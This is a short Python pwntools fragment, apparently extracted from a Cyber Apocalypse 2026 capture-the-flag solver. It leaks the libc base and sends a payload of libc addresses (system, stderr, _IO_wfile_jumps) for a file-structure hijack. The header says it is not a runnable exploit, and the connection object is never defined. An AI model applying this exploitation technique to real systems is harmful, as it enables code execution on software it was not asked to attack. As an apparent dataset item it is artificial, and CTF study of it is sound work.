# Source-derived semantic subcase from the official Cyber Apocalypse 2026 solver.
# Scope: EXP symbol/IO intent only; this file is not claimed as a runnable exploit.
from pwn import *

libc = ELF("./glibc/libc.so.6", checksec=False)

libc.address = u64(r.recv(8)) - libc.sym._IO_2_1_stdout_ - 132
pl = p64(libc.sym.system)
pl += p64(libc.sym._IO_2_1_stderr_)
pl += p64(libc.sym._IO_2_1_stderr_ - 0x48)
pl += p64(libc.sym._IO_wfile_jumps)
r.sendline(pl)
